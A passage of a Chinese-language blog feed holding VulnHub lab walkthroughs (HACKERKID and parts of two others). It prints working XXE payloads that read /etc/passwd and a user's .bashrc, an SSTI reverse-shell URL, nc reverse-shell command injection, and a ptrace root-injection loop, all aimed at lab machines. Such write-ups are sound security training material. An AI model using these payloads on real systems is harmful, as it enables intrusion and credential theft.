width=\"420\" alt=\"Image\">\n<p>将上传文件的数据包拦截下来，并通过 burp 重发数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-768.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"burp-重发数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-重发数据包\">#</a> burp 重发数据包</h3>\n<p>添加 cookie 字段，与另外一个 post 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-769.png\" width=\"520\" alt=\"Image\">\n<p>将 cookie 字段中的最后一个字母设置为随机大写字母</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-770.png\" width=\"470\" alt=\"Image\">\n<p>加载通过 crunch 生成的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-771.png\" width=\"380\" alt=\"Image\">\n<p>批量发包后发现没有得到有效的上传成功的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-772.png\" width=\"470\" alt=\"Image\">\n<p>Owls 页面也没有新的后门上传成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-773.png\" width=\"400\" alt=\"Image\">\n<p>注意这个 post 字段有严格的规范，不能有丝毫的错误，这个字段类型和字段内容中间需要一个空行才可以</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-774.png\" width=\"470\" alt=\"Image\">\n<p>再次重发，在 R 处找到了上传成功的 payload</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-775.png\" width=\"560\" alt=\"Image\">\n<p>并且在 owls 页面接收到了上传成功的后门文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-776.png\" width=\"400\" alt=\"Image\">\n<p>执行此后门，在监听端口的地方拿到了反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-777.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"py脚本提权\"><a class=\"markdownIt-Anchor\" href=\"#py脚本提权\">#</a> py 脚本提权</h3>\n<p>查看是否有除 root 账户以外的有 bash 的用户 <code>cat /etc/passwd | grep bash</code> <br>\n 查看是否有相关的敏感文件泄漏，找到了一个备份的密码文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-778.png\" width=\"480\" alt=\"Image\">\n<p>并且 Asterisk 的中文为星号</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-779.png\" width=\"520\" alt=\"Image\">\n<p>通过遗留的密码切换到更高一级的用户 athena 上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-780.png\" width=\"470\" alt=\"Image\">\n<p>查看相应的权限设置是否正确，发现可以直接调用 root 账户执行这个 py 脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-781.png\" width=\"520\" alt=\"Image\">\n<p>直接利用 root 权限执行此脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-782.png\" width=\"520\" alt=\"Image\">\n<p>并没有什么新发现，阅读此文件，发现可以通过拼接命令执行系统命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-783.png\" width=\"470\" alt=\"Image\">\n<p>构造命令 <code>id;nc 192.168.31.58 4445 -e /bin/bash;</code>  执行，将 shell 反弹到 kali 机器上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-784.png\" width=\"520\" alt=\"Image\">\n<p>Kali 上用来监听此端口，成功拿到了反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-785.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/126%20HACKERKID/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/126%20HACKERKID/",
            "title": "VULNHUB 26 HACKERKID",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2VyLWtpZC0xMDEsNzE5Lw==\">https://www.vulnhub.com/entry/hacker-kid-101,719/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDIyODEw\">https://blog.csdn.net/weixin_44107836/article/details/119422810</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKERKID：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）设置免密使用 sudo</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看 sudoers</span></span><br><span class=\"line\">sudo cat /etc/sudoers | tail -n 12 | head -n 8</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加免密登录</span></span><br><span class=\"line\">parallels ALL=(ALL) NOPASSWD:ALL</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">tail</span> -n表示筛选后面几行，<span class=\"built_in\">head</span> -n表示筛选前面几行</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-620.png\" width=\"380\" alt=\"Image\">\n<p>2 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-621.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.11</p>\n<p>3 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.31.11</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-622.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 53,80,9999</p>\n<h3 id=\"burp-重发数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-重发数据包\">#</a> Burp 重发数据包</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE=\">http://192.168.31.11</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-623.png\" width=\"650\" alt=\"Image\">\n<p>右键检查网页的源代码，发现提示，存在 page_no 的 GET 参数，即存在 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTE/cGFnZV9ubz14eA==\">http://192.168.31.11?page_no=xx</span> 的一个页面，可以通过 py 来编写 1-100 的自然数，并且用 burp 进行批量访问</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-624.png\" width=\"520\" alt=\"Image\">\n<p>编写 python 脚本，用于生成 1-100 个数字，每行有 1 个数字</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-625.png\" width=\"440\" alt=\"Image\">\n<p>通过 tail 和 head 命令来检查所生成的文件是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-626.png\" width=\"440\" alt=\"Image\">\n<p>用浏览器拦截数据发送至 burp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-627.png\" width=\"580\" alt=\"Image\">\n<p>将数据发送到 indruder 模式，在 page_no=<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 的位置设置字典，字典为前面 py 生成或者可以用 burp 自带的生成 1-100 的间隔为 1 的爆破字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-628.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 将接收包进行长度的排序得到一个不一样的长度，对应的 url 地址是 http://192.168.31.11?page_no=21</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-629.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"修改本地-hosts\"><a class=\"markdownIt-Anchor\" href=\"#修改本地-hosts\">#</a> 修改本地 hosts</h3>\n<p>得到提示，有一些子域名被创建出来了，并且其中之一是 hackers.blackhat.local</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-630.png\" width=\"620\" alt=\"Image\">\n<p>修改本地 hosts 文件，将此域名的 ip 解析指向为靶机地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-631.png\" width=\"420\" alt=\"Image\">\n<p>打开 http://hackers.blackhat.local 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-632.png\" width=\"620\" alt=\"Image\">\n<p>提示接下来的思路是搜集到更多的子域名信息，并且这些子域名解析后的地址指向为靶机的 ip 地址，通过 dig 来指定 DNS 服务器搜集 hackers.blackhat.local 信息</p>\n<h3 id=\"dig指定dns解析\"><a class=\"markdownIt-Anchor\" href=\"#dig指定dns解析\">#</a> dig 指定 DNS 解析</h3>\n<p>Linux 下解析域名除了使用 nslookup 之外，开可以使用 dig 命令来解析域名，dig 命令可以得到更多的域名信息。dig 命令主要用来从 DNS 域名服务器查询主机地址信息。dig 的全称是 (domain information groper) 域信息筛选器。它是一个用来灵活探测 DNS 的工具。</p>\n<p><code>dig hackers.blackhat.local @192.168.31.11</code></p>\n<p>从指定的 DNS 服务器上进行查询，(从默认的 DNS 服务器上获得的结果可能不准确)。指定 DNS 服务器的方式为使用 @ 符号，如果不指定 DNS 服务器，dig 会依次使用 /etc/resolv.conf 里的地址作为 DNS 服务器：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-633.png\" width=\"590\" alt=\"Image\">\n<p>得到了一个新的子域名，将 dig 的结果添加到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-634.png\" width=\"470\" alt=\"Image\">\n<p>访问 <span class=\"exturl\" data-url=\"aHR0cDovL2hhY2tlcmlkLmJsYWNraGF0LmxvY2Fs\">http://hackerid.blackhat.local</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-635.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"xxe-读取敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#xxe-读取敏感信息\">#</a> xxe 读取敏感信息</h3>\n<p>将所有的信息都填写上，进行数据包的抓取，判断数据是怎么进入后台的，是否存在相应的漏洞可以进行利用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-636.png\" width=\"440\" alt=\"Image\">\n<p>通过 burp 抓取数据，发现数据是以 xml 的形式传播的，可以测试 xxe 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-637.png\" width=\"440\" alt=\"Image\">\n<p>通过 xxe 漏洞进行读取 /etc/passwd</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">payload</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">  &lt;!DOCTYPE foo [&lt;!ENTITY dd SYSTEM &#x27;file:///etc/passwd&#x27;&gt;]&gt;</span><br><span class=\"line\">    &lt;root&gt;</span><br><span class=\"line\">      &lt;name&gt;&lt;/name&gt;</span><br><span class=\"line\">      &lt;tel&gt;&lt;/tel&gt;</span><br><span class=\"line\">      &lt;email&gt;</span><br><span class=\"line\">        &amp;dd;</span><br><span class=\"line\">      &lt;/email&gt;</span><br><span class=\"line\">      &lt;password&gt;&lt;/password&gt;</span><br><span class=\"line\">    &lt;/root&gt;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-638.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 读取成功，并且找到了相关用户，如 saket，接下来尝试读取各种敏感文件。利用 php 为协议：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">完整的payload是</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">  &lt;!DOCTYPE foo [&lt;!ENTITY dd SYSTEM &#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;&gt;]&gt;</span><br><span class=\"line\">  &lt;root&gt;</span><br><span class=\"line\">    &lt;name&gt;&lt;/name&gt;</span><br><span class=\"line\">    &lt;tel&gt;&lt;/tel&gt;</span><br><span class=\"line\">    &lt;email&gt;</span><br><span class=\"line\">      &amp;dd;</span><br><span class=\"line\">    &lt;/email&gt;</span><br><span class=\"line\">    &lt;password&gt;&lt;/password&gt;</span><br><span class=\"line\">    &lt;/root&gt;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-639.png\" width=\"650\" alt=\"Image\">\n<p>出现了一串 base64 加密的字符，利用 base -d 解密后发现是用户名和密码<br>\n <code>cat bashrc.txt| base64 -d</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-640.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; username=“admin” password=“Saket!#$%@!!”</p>\n<h3 id=\"用户名喷洒\"><a class=\"markdownIt-Anchor\" href=\"#用户名喷洒\">#</a> 用户名喷洒</h3>\n<p>这是一个 ssh 登陆或者网站的后台密码，前面端口扫描时有个 9999 端口没有收集信息，我们进到这个页面看看这个 9999 端口是什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-641.png\" width=\"440\" alt=\"Image\">\n<p>尝试用破解出来的账户密码登陆时发现登陆失败</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-642.png\" width=\"440\" alt=\"Image\">\n<p>通过前面收集到的信息的总结，知道 /home 目录下有 saket 的用户，并且密码中也有 saket 的存在，尝试将用户名换为 saket 进行登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-643.png\" width=\"440\" alt=\"Image\">\n<p>—&gt; 成功拿到后台权限</p>\n<h3 id=\"ssti模板注入\"><a class=\"markdownIt-Anchor\" href=\"#ssti模板注入\">#</a> SSTI 模板注入</h3>\n<p>登陆后台成功，提示需要一个 name 的参数</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-644.png\" width=\"440\" alt=\"Image\">\n<p>将 /name=1 的参数输入，在页面上出现了回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-645.png\" width=\"440\" alt=\"Image\">\n<p>接下来目标转向如何利用这个漏洞，用 nmap 扫描这个端口处是否存在框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-646.png\" width=\"340\" alt=\"Image\">\n<p>扫描到的结果是 torando 框架</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-647.png\" width=\"500\" alt=\"Image\">\n<p>发现框架为 python 框架，既然是 py 的，就可以尝试一下 SSTI 模板注入<br>\n关于 SSTI 模板注入，在 hacktrick 上有很详细的说明:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3NzdGktc2VydmVyLXNpZGUtdGVtcGxhdGUtaW5qZWN0aW9u\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</span></p>\n<p>SSTI 模板注入:  <code>http://192.168.31.60:9999/?name=&#123;&#123; 2 * 2 &#125;&#125;</code> <br>\n 页面回显为计算结果 4 ，表示此处确实存在 SSTI 模板注入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-648.png\" width=\"310\" alt=\"Image\">\n<p>导入包 os，执行系统命令:<br>\n <code>http://192.168.31.60:9999/?name=&#123;%%20import%20os%20%&#125;&#123;&#123;os.system(%27id%)27)&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-649.png\" width=\"650\" alt=\"Image\">\n<p>虽然当前没有回显出 id 命令执行后的结果，但是却也没有报错</p>\n<h3 id=\"ssti-反弹绕过\"><a class=\"markdownIt-Anchor\" href=\"#ssti-反弹绕过\">#</a> SSTI 反弹绕过</h3>\n<p>尝试用此处的 SSTI 模板进行反弹 shell</p>\n<p><code>http://192.168.31.60:9999/?name=&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >& /dev/tcp/192.168.31.135/4446 >&1\"')&#125;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-650.png\" width=\"650\" alt=\"Image\">\n<p>反弹 shell 时报错，接下来用编码的方式绕过这种检查</p>\n<p>采用 url 编码的方式，在线地址为 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc29ucy5jbi91cmxlbmNvZGU=\">http://www.jsons.cn/urlencode</span></p>\n<p>将 payload 进行编码后，拼接到原 url 后面，访问页面</p>\n<p><code>http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%22%27)%7D%7D</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-651.png\" width=\"650\" alt=\"Image\">\n<p>与此同时，监听对应的端口，等到 shell 的反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-652.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 得到 shell</p>\n<h3 id=\"弹出标准-shell\"><a class=\"markdownIt-Anchor\" href=\"#弹出标准-shell\">#</a> 弹出标准 SHELL</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">美化得到的终端</span></span><br><span class=\"line\">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo; fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">或者使用</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SHELL是环境变量，它的值代表系统执行shell的文件位置。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">script 命令的原本作用是录制终端的会话过程，执行该命令后会运行一个新的shell，在此shell中执行命令的过程将会记录下来并保存在一个文件里面。这里执行 script 并不需要录制命令过程，我们需要的仅仅是它会运行一个新的shell。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-q 代表以静默方式运行一个新的shell，也就是说在后台运行一个新的shell。如果不加这个参数，则会弹出一个新的shell命令框。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/null在这条命令中扮演的角色是保存script记录的文件，但是/dev/null一个特殊的设备文件，一切写入改文件的数据都会消失。我们不需要记录我们所执行的命令，所以将script所记录的内容指向该设备文件。</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-653.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"linpeas-提权信息扫描\"><a class=\"markdownIt-Anchor\" href=\"#linpeas-提权信息扫描\">#</a> linpeas 提权信息扫描</h3>\n<p>尝试用 linux 提权工具提权，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1rYWxpbGlucGVhcy0zcDhxbTIwYjN4Ynp3OGFmN2dsNGI4eDNnLnNo\">提前在 kali 上准备好 linpeas.sh</span> 并通过 py 开启简易 web</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-654.png\" width=\"520\" alt=\"Image\">\n<p>在靶机上下载 linpeas.sh 并加可执行权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-655.png\" width=\"520\" alt=\"Image\">\n<p>执行并开始扫描./linpeas.sh</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-656.png\" width=\"420\" alt=\"Image\">\n<p>发现了 python2.7 的权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-657.png\" width=\"360\" alt=\"Image\">\n<h3 id=\"cap_sys_ptrace-提权\"><a class=\"markdownIt-Anchor\" href=\"#cap_sys_ptrace-提权\">#</a> cap_sys_ptrace 提权</h3>\n<p>关于 cap_sys_ptrace 提权的教程：<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LWhhcmRlbmluZy9wcml2aWxlZ2UtZXNjYWxhdGlvbi9saW51eC1jYXBhYmlsaXRpZXM=\">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</span></p>\n<p>Capabilities 机制是在 Linux 内核 2.2 之后引入的，原理很简单，就是将之前与超级用户 root（UID=0）关联的特权细分为不同的功能组，Capabilites 作为线程（Linux 并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>\n<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是 root，就去检查其是否具有该特权操作所对应的 capabilities，并以此为依据，决定是否可以执行特权操作。如果 Capabilities 设置不正确，就会让攻击者有机可乘，实现权限提升。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-658.png\" width=\"520\" alt=\"Image\">\n<p>保存 payload，并按 hacktrick 上的教程进行复现</p>\n<p>利用参考中的 exp.py 文件，传入参数为选择的进程 id, 执行成功后会在靶机的 5600 端口开一个绑定 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-659.png\" width=\"460\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不一样的能力，每种能力表明必定的特权操做。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">setcap</span>来设置权限，<span class=\"built_in\">getcap</span>来验证权限是否设置正确。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CAP_SYS_PTRACE允许使用ptrace( 2 )和最近引入的跨内存附加系统调用，如果授予此功能并且ptrace( 2 )系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制。</span></span><br><span class=\"line\">getcap -r / 2&gt;/dev/null</span><br><span class=\"line\">/usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过<span class=\"keyword\">for</span>循环，来依次注入每一个root进程号</span></span><br><span class=\"line\">for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#x27;&#123;print $2&#125;&#x27;`; do python2.7 exp.py $i; done</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-660.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注入成功后即可获取到root权限的shell</span></span><br><span class=\"line\">netstat -an | grep 5600</span><br><span class=\"line\">nc 192.168.31. 11 5600</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-661.png\" width=\"480\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/128%20BLUEMOON/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/128%20BLUEMOON/",
            "title": "VULNHUB 28 BLUEMOON",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmx1ZW1vb24tMjAyMSw2Nzkv\">https://www.vulnhub.com/entry/bluemoon-2021,679/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81ZDViN2YyZDIwZTQ=\">https://www.jianshu.com/p/5d5b7f2d20e4</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 BLUEMOON：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-702.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-703.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,22,80</p>\n<h3 id=\"ftp-弱口令\"><a class=\"markdownIt-Anchor\" href=\"#ftp-弱口令\">#</a> FTP 弱口令</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-704.png\" width=\"440\" alt=\"Image\">\n<p>查看源代码，发现一个图片的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-705.png\" width=\"650\" alt=\"Image\">\n<p>看样子是一个蓝色的月球，但是这个图片没什么作用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-706.png\" width=\"650\" alt=\"Image\">\n<p>先尝试从 ftp 进行突破 <code>ftp 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-707.png\" width=\"370\" alt=\"Image\">\n<p>尝试弱口令登陆失败，接下来对 80 网站进行目录扫描</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>可以使用各种工具扫描，扫描结果可能因为字典的不同而得到不同的结果，这里我用 dirmap 和 gobuster 两者都扫描了一次</p>\n<p><code>python3 dirmap.py -i http://192.168.0.153 -lcf</code> <br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-708.png\" width=\"650\" alt=\"Image\">\n<p>dirmap 默认的字典并不是很全，如果需要有更准确的信息，需要换字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-709.png\" width=\"650\" alt=\"Image\">\n<p>用 dirbuster 中的 directory 字典扫出来了一个目录：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvaGlkZGVuX3RleHQ=\">http://192.168.0.153/hidden_text</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-710.png\" width=\"570\" alt=\"Image\">\n<p>查看源代码，看能否有更多的发现，找到了一个隐藏的图片</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-711.png\" width=\"430\" alt=\"Image\">\n<p>访问得到了一个 url 地址: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvLlFSX0MwZDMucG5n\">http://192.168.0.153/.QR_C0d3.png</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-712.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"linux-识别二维码\"><a class=\"markdownIt-Anchor\" href=\"#linux-识别二维码\">#</a> linux 识别二维码</h3>\n<p>用 linux 来识别这个二维码，看能否从这个二维码中得到更多可靠的信息</p>\n<p>下载到 kali 机器上，并修改文件名字为 qr.png:  <code>wget http://192.168.0.153/.QR_C0d3.png -O qr.png</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-713.png\" width=\"520\" alt=\"Image\">\n<p>Linux 下可以用 zbarimg 来识别二维码<br>\n <code>zbarimg x.png</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-714.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 找到了 ftp 的账户和密码 